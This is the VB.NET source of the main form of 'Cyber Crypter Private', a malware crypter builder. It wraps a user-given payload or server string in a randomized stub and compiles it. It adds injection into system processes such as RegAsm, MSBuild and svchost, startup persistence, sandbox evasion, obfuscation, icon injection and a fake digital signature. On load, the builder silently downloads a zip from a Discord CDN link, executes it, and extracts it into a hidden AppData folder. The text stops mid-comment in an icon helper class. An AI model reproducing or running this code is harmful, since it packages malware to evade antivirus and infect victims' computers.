Imports System.Text
Imports System.CodeDom.Compiler
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.Cryptography
Imports System.IO
Imports System.Management
Imports System.Net
Imports Microsoft.Win32
Imports System
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Reflection
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Cyber_Crypter_Private.My
Imports Cyber_Crypter_Private.My.Resources
Imports Microsoft.CSharp
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System.IO.Compression
Imports System.Net.Sockets

Public Class frmMain
#Region "RANDOMSTRING"
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

        Dim s As String
        s = eng
        Dim sb As New StringBuilder
        For i As Integer = 1 To 25
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
#End Region
#Region "CODEDOM"
    Sub Codedom(ByVal Path As String, ByVal Code As String, ByVal MainClass As String)
        Dim providerOptions = New Collections.Generic.Dictionary(Of String, String) 'Thanks to Cobac for adding this.
        providerOptions.Add("CompilerVersion", "v4.0")
        Dim CodeProvider As New Microsoft.CSharp.CSharpCodeProvider(providerOptions)
        Dim Parameters As New CompilerParameters
        With Parameters
            .GenerateExecutable = True
            .OutputAssembly = Path
            .CompilerOptions += "/platform:X86 /unsafe /target:winexe"
            .MainClass = MainClass
            .IncludeDebugInformation = False
            .ReferencedAssemblies.Add("System.Windows.Forms.dll")
            .ReferencedAssemblies.Add("Microsoft.VisualBasic.dll")

            .ReferencedAssemblies.Add("System.Core.dll")
            .ReferencedAssemblies.Add("System.Data.dll")
            .ReferencedAssemblies.Add("System.Drawing.dll")
            .ReferencedAssemblies.Add("System.Xml.dll")
            .ReferencedAssemblies.Add("System.Xml.Linq.dll")
            .ReferencedAssemblies.Add("System.dll")

            .ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName)
            .ReferencedAssemblies.Add(Application.ExecutablePath)
        End With
        Dim Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code)
        If Results.Errors.Count > 0 Then
            For Each E In Results.Errors
                MsgBox(E.ErrorText)
            Next
        End If
    End Sub

#End Region
#Region "Responsive Sleep"
    Public Sub ResponsiveSleep(ByRef iMilliSeconds As Integer)
        Dim i As Integer, iHalfSeconds As Integer = iMilliSeconds / 500
        For i = 1 To iHalfSeconds
            Threading.Thread.Sleep(500) : Application.DoEvents()
        Next i
    End Sub
#End Region
#Region "WINRAR"
    Sub UnRar(ByVal WorkingDirectory As String, ByVal filepath As String)

        ' Microsoft.Win32 and System.Diagnostics namespaces are imported

        Dim objRegKey As Microsoft.Win32.RegistryKey
        objRegKey = Microsoft.Win32.Registry.ClassesRoot.OpenSubKey("WinRAR\Shell\Open\Command")
        ' Windows 7 Registry entry for WinRAR Open Command

        Dim obj As Object = objRegKey.GetValue("")

        Dim objRarPath As String = obj.ToString()
        objRarPath = objRarPath.Substring(1, objRarPath.Length - 7)

        objRegKey.Close()

        Dim objArguments As String
        ' in the following format
        ' " X G:\Downloads\samplefile.rar G:\Downloads\sampleextractfolder\"
        objArguments = " X " & " " & filepath & " " + " " + WorkingDirectory

        Dim objStartInfo As New ProcessStartInfo()
        ' Set the UseShellExecute property of StartInfo object to FALSE
        ' Otherwise the we can get the following error message
        ' The Process object must have the UseShellExecute property set to false in order to use environment variables.
        objStartInfo.UseShellExecute = False
        objStartInfo.FileName = objRarPath
        objStartInfo.Arguments = objArguments
        objStartInfo.WindowStyle = ProcessWindowStyle.Hidden
        objStartInfo.WorkingDirectory = WorkingDirectory & "\"

        Dim objProcess As New Process()
        objProcess.StartInfo = objStartInfo
        objProcess.Start()

    End Sub
#End Region
    Function GetAppDataPath() As String
        Return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    End Function
    Public Shared Digital_Signature As Boolean
    Private Razor As String = String.Empty
    Private Signatures As Byte()
    Dim cpuInfo As String
    Dim FileCSPROJ = GetAppDataPath() + "\Cyber_Crypter5\WindowsFormsApplication49.csproj"
    Dim FileZIP = GetAppDataPath() + "\Cyber_Crypter5.zip"
    Dim FileEXE = GetAppDataPath() + "\Cyber_Crypter5\bin\Debug\WindowsFormsApplication49.exe"
    Dim FileCS = GetAppDataPath() + "\Cyber_Crypter5\Program.cs"
    Dim FileFOLDER = GetAppDataPath() + "\Cyber_Crypter5"
    Dim DOWNLOAD As String = "https://cdn.discordapp.com/attachments/876742387932745741/876894903337115688/WindowsFormsApplication49.zip"

    Private Sub frmMain_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        ServicePointManager.Expect100Continue = True
        ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

        Dim devil As String
        Dim x As New System.Text.StringBuilder
        x.Append(DOWNLOAD)
        devil = x.ToString

        Dim URL As String = devil
        Dim DownloadTo As String = FileZIP
        Try
            Dim w As New Net.WebClient
            IO.File.WriteAllBytes(DownloadTo, w.DownloadData(URL))
            Shell(DownloadTo)
        Catch ex As Exception
        End Try

        Dim EytPo As String = FileFOLDER
        Dim elFpv As Boolean = Not Directory.Exists(EytPo)
        If elFpv Then
            Dim qskGy As DirectoryInfo = Directory.CreateDirectory(EytPo)
            qskGy.Attributes = (FileAttributes.Hidden Or FileAttributes.Directory)
        End If

        Dim Checkf = MyProject.Computer.FileSystem.FileExists(FileCSPROJ)
        If Not Checkf Then
            UnRar(FileFOLDER, FileZIP)

        End If
        Try
        Catch ex As Exception
        End Try
        Try
            frmSettings.GunaTextBox3.Text = Randomization.RandomPassword.Generate(15, 15)
            frmSettings.GunaComboBox1.SelectedItem = "Normal"
            Guna.UI.Lib.GraphicsHelper.ShadowForm(Me)

            Me.WindowState = FormWindowState.Normal
            Me.MinimumSize = Me.Size
            Me.MaximumSize = Me.Size

            Dim mutex As Mutex = New Mutex(False, "SINGLE_INSTANCE_APP_MUTEX")
            Dim flag As Boolean = Not mutex.WaitOne(0, False)
            If flag Then
                mutex.Close()
                Environment.[Exit](1)
            End If

            'For Each process As Process In process.GetProcesses()
            '    flag = (Operators.CompareString(process.ProcessName, "SandboxieRpcSs", False) = 0)
            '    If flag Then
            '        process.Kill()
            '        MessageBox.Show("Sandboxie detected please try on another computer.", "Cyber Crypter")
            '        Environment.Exit(1)
            '    End If
            'Next

            'Dim localMachine As RegistryKey = Registry.LocalMachine
            'Dim registryKey As RegistryKey = localMachine.OpenSubKey("SOFTWARE\VMware, Inc.\Vmware Tools")
            'flag = (registryKey Is Nothing)
            'If Not flag Then
            '    MessageBox.Show("VMware detected please try on another computer.", "Cyber Crypter")
            '    Environment.Exit(1)
            'End If

            'flag = MyProject.Computer.FileSystem.FileExists(Application.StartupPath + FileCS)
            'If flag Then

            'Else
            '    MessageBox.Show("The required files could not be found", "Cyber Crypter", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            '    Environment.[Exit](1)
            'End If


            ServicePointManager.Expect100Continue = True
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12

            'Dim address As String = "https://raw.githubusercontent.com/neox0rz/neoconfuser/main/version"
            'Dim client As WebClient = New WebClient()
            'Dim reply As String = client.DownloadString(address)
            'Label3.Text = reply

            Dim control = MyProject.Computer.FileSystem.FileExists("C:\Program Files (x86)\MSBuild\14.0\Bin\MSBuild.exe")

            If Not control Then
             frmError.Show()
            End If

        Catch ex As Exception

        End Try

    End Sub
    Private Sub GunaButton4_Click(sender As Object, e As EventArgs) Handles GunaButton4.Click
        frmSettings.Show()
    End Sub

    Private Sub GunaButton5_Click(sender As Object, e As EventArgs) Handles GunaButton5.Click
        frmAssembly.Show()
    End Sub

    Private Sub GunaButton1_Click(sender As Object, e As EventArgs) Handles GunaButton1.Click
        Dim Open As New OpenFileDialog
        Open.Filter = "Icon Files (*.ico)|*.ico"
        If Open.ShowDialog = vbOK Then
            GunaTextBox1.Text = Open.FileName
            PictureBox4.Image = Drawing.Icon.ExtractAssociatedIcon(GunaTextBox1.Text).ToBitmap
        End If
    End Sub

    Private Sub GunaControlBox1_Click(sender As Object, e As EventArgs) Handles GunaControlBox1.Click
        Environment.Exit(1)
    End Sub

    Private Sub GunaButton3_Click_1(sender As Object, e As EventArgs) Handles GunaButton3.Click
  
        If TextBox1.Text = "" Then

        Else
            frmSelect.Show()
        End If

    End Sub
    Dim vcFUoknuUGOaxmFuhuaHnywrk
    Public Function newversion()
        If TextBox1.Text = "" Then

        Else
            Dim Save As New SaveFileDialog
            Save.Filter = "Executable Files (*.exe)|*.exe"
            Save.FileName = ""
            If Save.ShowDialog = vbOK Then

                Dim path2 As String = FileEXE
                Dim flag = File.Exists(path2)
                If flag Then
                    File.Delete(path2)
                End If
                Try
                    Dim crypter As Boolean = Operators.CompareString(Me.TextBox1.Text, "", False) = 0
                    If crypter Then
                        Environment.Exit(1)
                    Else



                        Dim text As String = My.Resources._New

                        text = text.Replace("%1%", Me.RandomString()).Replace("%2%", Me.RandomString()).Replace("%3%", Me.RandomString()).Replace("%4%", Me.RandomString()).Replace("%5%", Me.RandomString()).Replace("%28%", Me.RandomString()).Replace("%6%", Me.RandomString()).Replace("%7%", Me.RandomString()).Replace("%8%", Me.RandomString()).Replace("%9%", Me.RandomString()).Replace("%10%", Me.RandomString()).Replace("%11%", Me.RandomString()).Replace("%12%", Me.RandomString()).Replace("%13%", Me.RandomString()).Replace("%14%", Me.RandomString()).Replace("%15%", Me.RandomString()).Replace("%16%", Me.RandomString()).Replace("%17%", Me.RandomString()).Replace("%18%", Me.RandomString()).Replace("%19%", Me.RandomString()).Replace("%20%", Me.RandomString()).Replace("%21%", Me.RandomString()).Replace("%22%", Me.RandomString()).Replace("%23%", Me.RandomString()).Replace("%24%", Me.RandomString()).Replace("%25%", Me.RandomString()).Replace("%44%", Me.RandomString()).Replace("%26%", Me.RandomString()).Replace("%35%", Me.RandomString()).Replace("%36%", Me.RandomString()).Replace("%37%", Me.RandomString()).Replace("%29%", Me.RandomString()).Replace("%27%", Me.RandomString()).Replace("%90%", Me.RandomString()).Replace("%Atom%", Me.RichTextBox2.Text).Replace("%30%", Me.RandomString()).Replace("%31%", Me.RandomString()).Replace("%34%", Me.RandomString()).Replace("%32%", Me.RandomString()).Replace("%Server%", TextBox1.Text).Replace("%DownloadLink%", frmSettings.GunaTextBox4.Text()).Replace("%33%", Me.RandomString()).Replace("%34%", Me.RandomString()).Replace("%35%", Me.RandomString()).Replace("%36%", Me.RandomString()).Replace("%37%", Me.RandomString()).Replace("%38%", Me.RandomString()).Replace("%39%", Me.RandomString()).Replace("%FolderName%", frmSettings.TextBox11.Text()).Replace("%Name%", frmSettings.TextBox12.Text()).Replace("%Startup File Name%", frmSettings.TextBox13.Text()).Replace("%Sleep%", frmSettings.GunaTextBox1.Text + "000")
                        vcFUoknuUGOaxmFuhuaHnywrk = text

                        If frmSettings.GunaComboBox1.SelectedItem = "Normal" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", "Application.ExecutablePath")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "RegAsm" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "MsBuild" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "vbc" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "svchost" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\System32\\svchost.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "schtasks" Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\System32\\schtasks.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "explorer" Then

                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\explorer.exe""")
                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "powershell" Then

                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""")

                        ElseIf frmSettings.GunaComboBox1.SelectedItem = "RegSvcs" Then

                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe""")

                        End If


                        If frmSettings.Guna2ToggleSwitch9.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//download ", Nothing)



                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//download", "//" + RandomString())

                        End If

                        If frmSettings.Guna2ToggleSwitch6.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Sleep", Nothing)
                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Sleep", "//" + RandomString())
                        End If


                        If frmSettings.Guna2ToggleSwitch1.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//start ", Nothing)


                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//start", "//" + RandomString())

                        End If


                        If frmSettings.Guna2ToggleSwitch4.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//sandboxie ", Nothing)


                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//sandboxie", "//" + RandomString())

                        End If


                        If frmSettings.Guna2ToggleSwitch8.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("//Messega", My.Settings.msg.Replace("msgb", frmSettings.textbox16.Text).Replace("msgt", frmSettings.textbox15.Text).Replace("OK", frmSettings.MSGBUTTON.Items(frmSettings.MSGBUTTON.SelectedIndex).ToString).Replace("Stop", frmSettings.MSGICON.Items(frmSettings.MSGICON.SelectedIndex).ToString))
                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("//Messega", "//" + RandomString())
                        End If
                        vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk


                        If frmAssembly.Guna2ToggleSwitch1.Checked = True Then
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Assembly ", Nothing)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", frmAssembly.TextBoxTitle.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", frmAssembly.TextBoxDescription.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", frmAssembly.TextBoxCompany.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", frmAssembly.TextBoxProduct.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", frmAssembly.TextBoxCopyright.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", frmAssembly.num1.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", frmAssembly.num2.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", frmAssembly.num3.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", frmAssembly.num4.Text)
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Default", "//" + RandomString())
                        Else
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Assembly", "//" + RandomString())
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{1}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{2}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{3}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{4}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{5}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{7}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{8}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{9}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = vcFUoknuUGOaxmFuhuaHnywrk.Replace("{10}", RandomString)
                            vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Default", Nothing)
                        End If


                        'Clipboard.SetText(Me.vcFUoknuUGOaxmFuhuaHnywrk)

                        Me.RichTextBox1.Text = Me.vcFUoknuUGOaxmFuhuaHnywrk
                        Dim path As String = FileCS
                        crypter = File.Exists(path)
                        If crypter Then
                            Dim streamWriter As StreamWriter = New StreamWriter(path)
                            streamWriter.Write(Me.RichTextBox1.Text)
                            streamWriter.Close()
                        Else
                            MessageBox.Show("File does not exist", "Cyber Crypter", MessageBoxButtons.OK, MessageBoxIcon.Hand)
                        End If

                    End If

                    Me.ResponsiveSleep(1300)

                    Dim str As String = FileCSPROJ
                    crypter = MyProject.Computer.FileSystem.FileExists("C:\Program Files (x86)\MSBuild\14.0\Bin\MSBuild.exe")

                    If Not crypter Then
                        frmError.Show()
                    End If


                    Me.ResponsiveSleep(21300)

                    Dim text2 As String = FileEXE
                    Dim destFileName As String = Save.FileName

                    Me.ResponsiveSleep(1300)


                    Dim path22 As String = FileEXE
                    Dim destFileNamse As String = Save.FileName
                    crypter = File.Exists(path22)
                    File.Copy(text2, destFileName)



                    If crypter Then
                        File.Delete(path22)
                    End If

                    If GunaTextBox1.Text = "" Then
                    Else
                        IconInjector.InjectIcon(Save.FileName, GunaTextBox1.Text)
                    End If
                    If frmSettings.Guna2ToggleSwitch7.Checked = True Then
                        Try


                            Me.Signatures = My.Resources.cert
                            File.WriteAllBytes((Save.FileName & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save.FileName), Me.Signatures, frmMain.Digital_Signature))
                        Catch ex As Exception

                        End Try
                    Else

                    End If



                    path2 = frmSettings.Guna2ToggleSwitch2.Checked
                    If path2 Then

                        Confuser.Obfuscate(Save.FileName)
                        File.Delete(Save.FileName)

                    End If

                    frmMessage.Show()

                Catch ex As Exception
                End Try
            End If
        End If
    End Function


    Public Function oldversion()

        If TextBox1.Text = "" Then

        Else
            Dim Save As New SaveFileDialog
            Save.Filter = "Executable Files (*.exe)|*.exe"
            Save.FileName = ""
            If Save.ShowDialog = vbOK Then
                Dim cb() As Byte



                If TextBox1.Text <> "" Then
                    cb = ASCIIEncoding.ASCII.GetBytes(TextBox1.Text)
                    For x As Integer = 0 To cb.Length - 1
                        GunaTextBox2.AppendText(cb(x).ToString & " ,")
                    Next
                End If



                'ServicePointManager.Expect100Continue = True
                'ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12
                'Dim address As String = "https://cdn.discordapp.com/attachments/859130004898447360/867385530261831690/message.txt"
                'Dim client As WebClient = New WebClient()
                'Dim reply As String = client.DownloadString(address)



                Dim text As String = My.Resources.Stub

                text = text.Replace("%1%", RandomString()).Replace("%2%", RandomString()).Replace("%3%", RandomString()).Replace("%4%", RandomString()).Replace("%5%", RandomString()).Replace("%6%", RandomString()).Replace("%7%", RandomString()).Replace("%8%", RandomString()).Replace("%9%", RandomString()).Replace("%10%", RandomString()).Replace("%11%", RandomString()).Replace("%12%", RandomString()).Replace("%13%", RandomString()).Replace("%14%", RandomString()).Replace("%DownloadLink%", frmSettings.GunaTextBox4.Text()).Replace("%Server%", TextBox1.Text()).Replace("%33%", Me.RandomString()).Replace("%34%", Me.RandomString()).Replace("%35%", Me.RandomString()).Replace("%36%", Me.RandomString()).Replace("%37%", Me.RandomString()).Replace("%38%", Me.RandomString()).Replace("%39%", Me.RandomString()).Replace("%FolderName%", frmSettings.TextBox11.Text()).Replace("%Name%", frmSettings.TextBox12.Text()).Replace("%Startup File Name%", frmSettings.TextBox13.Text()).Replace("%Sleep%", frmSettings.GunaTextBox1.Text + "000")
                If frmSettings.GunaComboBox1.SelectedItem = "Normal" Then
                    text = text.Replace("""appyrun""", "Application.ExecutablePath")





                ElseIf frmSettings.GunaComboBox1.SelectedItem = "RegAsm" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegAsm.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "MsBuild" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "vbc" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\vbc.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "svchost" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\System32\\svchost.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "schtasks" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\System32\\schtasks.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "explorer" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\explorer.exe""")
                ElseIf frmSettings.GunaComboBox1.SelectedItem = "powershell" Then
                    text = text.Replace("""appyrun""", """C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe""")

                ElseIf frmSettings.GunaComboBox1.SelectedItem = "RegSvcs" Then

                    text = text.Replace("""appyrun""", """C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\RegSvcs.exe""")

                End If
                If frmSettings.Guna2ToggleSwitch9.Checked = True Then
                    text = Replace(text, "//download ", Nothing)



                Else
                    text = Replace(text, "//download", "//" + RandomString())

                End If



                If frmSettings.Guna2ToggleSwitch1.Checked = True Then
                    text = Replace(text, "//start ", Nothing)


                Else
                    text = Replace(text, "//start", "//" + RandomString())

                End If
                If frmSettings.Guna2ToggleSwitch6.Checked = True Then
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Sleep", Nothing)
                Else
                    vcFUoknuUGOaxmFuhuaHnywrk = Replace(vcFUoknuUGOaxmFuhuaHnywrk, "//Sleep", "//" + RandomString())
                End If

                If frmSettings.Guna2ToggleSwitch4.Checked = True Then
                    text = Replace(text, "//sandboxie ", Nothing)


                Else
                    text = Replace(text, "//sandboxie", "//" + RandomString())

                End If


                If frmSettings.Guna2ToggleSwitch8.Checked = True Then
                    text = text.Replace("//Messega", My.Settings.msg.Replace("msgb", frmSettings.textbox16.Text).Replace("msgt", frmSettings.textbox15.Text).Replace("OK", frmSettings.MSGBUTTON.Items(frmSettings.MSGBUTTON.SelectedIndex).ToString).Replace("Stop", frmSettings.MSGICON.Items(frmSettings.MSGICON.SelectedIndex).ToString))
                Else
                    text = text.Replace("//Messega", "//" + RandomString())
                End If
                text = text


                If frmAssembly.Guna2ToggleSwitch1.Checked = True Then
                    text = Replace(text, "//Assembly ", Nothing)
                    text = text.Replace("{1}", frmAssembly.TextBoxTitle.Text)
                    text = text.Replace("{2}", frmAssembly.TextBoxDescription.Text)
                    text = text.Replace("{3}", frmAssembly.TextBoxCompany.Text)
                    text = text.Replace("{4}", frmAssembly.TextBoxProduct.Text)
                    text = text.Replace("{5}", frmAssembly.TextBoxCopyright.Text)
                    text = text.Replace("{7}", frmAssembly.num1.Text)
                    text = text.Replace("{8}", frmAssembly.num2.Text)
                    text = text.Replace("{9}", frmAssembly.num3.Text)
                    text = text.Replace("{10}", frmAssembly.num4.Text)
                    text = Replace(text, "//Default", "//" + RandomString())
                Else
                    text = Replace(text, "//Assembly", "//" + RandomString())
                    text = text.Replace("{1}", RandomString)
                    text = text.Replace("{2}", RandomString)
                    text = text.Replace("{3}", RandomString)
                    text = text.Replace("{4}", RandomString)
                    text = text.Replace("{5}", RandomString)
                    text = text.Replace("{7}", RandomString)
                    text = text.Replace("{8}", RandomString)
                    text = text.Replace("{9}", RandomString)
                    text = text.Replace("{10}", RandomString)
                    text = Replace(text, "//Default", Nothing)
                End If


                Codedom(Save.FileName, text, Nothing)
                If GunaTextBox1.Text = "" Then
                Else
                    IconInjector.InjectIcon(Save.FileName, GunaTextBox1.Text)
                End If
                If frmSettings.Guna2ToggleSwitch2.Checked = True Then


                    Confuser.Obfuscate(Save.FileName)

                    File.Delete(Save.FileName)


                Else

                End If
                If frmSettings.Guna2ToggleSwitch7.Checked = True Then
                    Try


                        Me.Signatures = My.Resources.cert
                        File.WriteAllBytes((Save.FileName & GDigital.Digital_Signatures("Třɠͯѩգ١ܪࡦॺ੤")), Digital.Signature(File.ReadAllBytes(Save.FileName), Me.Signatures, frmMain.Digital_Signature))
                    Catch ex As Exception

                    End Try
                Else

                End If

                'Clipboard.SetText(text)
                frmMessage.Show()
                RichTextBox1.Text = ""
            End If
        End If
    End Function
    Private Sub frmMain_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        Environment.Exit(1)
    End Sub

    Private Sub frmMain_FormClosed(sender As Object, e As FormClosedEventArgs) Handles MyBase.FormClosed
        Environment.Exit(1)
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick

    End Sub

    Private Sub GunaButton2_Click(sender As Object, e As EventArgs) Handles GunaButton2.Click
        Process.Start("https://t.me/cyberypter")
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick

    End Sub

    Private Sub GunaButton6_Click(sender As Object, e As EventArgs) Handles GunaButton6.Click
        frmDownload.Show()
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub
End Class
#Region "ICON"
Public Class IconInjector

    <SuppressUnmanagedCodeSecurity()> _
    Private Class NativeMethods
        <DllImport("kernel32")> _
        Public Shared Function BeginUpdateResource( _
            ByVal fileName As String, _
            <MarshalAs(UnmanagedType.Bool)> ByVal deleteExistingResources As Boolean) As IntPtr
        End Function

        <DllImport("kernel32")> _
        Public Shared Function UpdateResource( _
            ByVal hUpdate As IntPtr, _
            ByVal type As IntPtr, _
            ByVal name As IntPtr, _
            ByVal language As Short, _
            <MarshalAs(UnmanagedType.LPArray, SizeParamIndex:=5)> _
            ByVal data() As Byte, _
            ByVal dataSize As Integer) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function

        <DllImport("kernel32")> _
        Public Shared Function EndUpdateResource( _
            ByVal hUpdate As IntPtr, _
            <MarshalAs(UnmanagedType.Bool)> ByVal discard As Boolean) As <MarshalAs(UnmanagedType.Bool)> Boolean
        End Function
    End Class

    ' The first structure in an ICO file lets us know how many images are in the file.
    <StructLayout(LayoutKind.Sequential)> _
    Private Structure ICONDIR
        Public Reserved As UShort  ' Reserved, must be 0
        Public Type As UShort      ' Resource type, 1 for icons.
        Public Count As UShort     ' How many images.
        ' The native structure has an array of ICONDIRENTRYs as a final field.
    End Structure

    ' Each ICONDIRENTRY describes one icon stored in the ico file. The offset says where the icon image data
    ' starts in the file. The other fields give the information required to turn that image data into a valid
